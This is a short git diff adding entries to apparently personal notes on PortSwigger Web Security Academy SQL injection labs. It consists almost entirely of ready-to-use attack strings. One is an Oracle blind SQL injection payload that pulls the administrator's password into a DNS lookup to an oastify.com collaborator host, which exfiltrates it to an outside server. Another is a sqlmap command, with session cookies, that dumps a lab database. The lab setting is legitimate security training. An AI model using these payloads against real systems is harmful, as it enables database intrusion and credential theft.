@@ -83,6 +83,12 @@ sqlmap -u 'https://0af8009d04c75cb982ec1fad00b000f3.web-security-academy.net/' -
 
 **Blind SQL injection with out-of-band interaction**
 TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//gey1m5rfwgrrziuc0kzjw79rbih95zto.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+**Blind SQL injection with out-of-band data exfiltration**
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.t1ve9iesjte4mvhpnxmwjkw4yv4nseg3.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+**Blind SQL injection with time delays and information retrieval**
+sqlmap -u https://0a90007c04bab92587b8e428007000cc.web-security-academy.net/filter?category=Pets --cookie='TrackingId=UHZLQBAIdk2AG3B6; session=y6Ahq7PyRbMTRY1SPNrk9rMCNMpPXpUI' --level 2 --dbms=postgresql --dump --threads=5
  
 ## Summary
 
